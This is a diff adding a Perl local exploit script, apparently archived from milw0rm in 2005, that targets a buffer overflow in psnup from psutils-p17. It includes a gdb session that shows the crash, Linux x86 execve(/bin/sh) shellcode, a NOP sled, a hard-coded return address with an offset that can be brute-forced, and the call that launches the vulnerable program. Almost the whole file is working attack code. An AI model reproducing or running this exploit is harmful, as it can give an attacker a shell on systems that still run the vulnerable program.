@@ -1,0 +1,52 @@
+#!/usr/bin/perl
+
+#         PostScript Utilities - psnup  (all the utilities of the package are vulnerable) *
+#      						 	                                  *	
+#           written by lammat just for practice purposes                                  *
+#                       tested against psutils-p17                                        *
+# (gdb) r -8 `perl -e 'print "A"x250'`                                                    *
+# The program being debugged has been started already.                                    *
+# Start it from the beginning? (y or n) y                                                 *
+# Starting program: /usr/bin/psnup -8 `perl -e 'print "A"x250'`                           *
+# (no debugging symbols found).../usr/bin/psnup: can't open input file                    *
+# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA....                     *
+#                                                                                         *
+# Program received signal SIGSEGV, Segmentation fault.                                    *   
+# 0x41414141 in ?? ()                                                                     *  
+
+#  execve(/bin/sh) for linux x86
+#   29 bytes
+#   by Matias Sedalo
+
+
+$shellcode = 
+"\x31\xdb\x53\x8d\x43\x17\xcd\x80\x99\x68\x6e\x2f\x73\x68\x68".
+"\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+$len = 250;
+$ret = 0xbffff3a0; 
+$nop = "\x90";
+$oops="/usr/bin/psnup";
+$offset = 900; 
+
+# offset bruteforce purposes below
+if (@ARGV == 1) {
+    $offset = $ARGV[0];}
+
+for ($i=0; $i<($len-length($shellcode)-100);$i++)
+	{$buffer .= $nop;
+}
+
+$buffer .= $shellcode;
+
+print ("Address: 0x",sprintf('%lx',($ret + $offset)),"\n");
+
+$new_ret = pack('l',($ret + $offset));
+
+until(length($buffer)==$len)
+{
+$buffer.=$new_ret;
+}
+exec("$oops -8 $buffer");
+
+# milw0rm.com [2005-03-21]
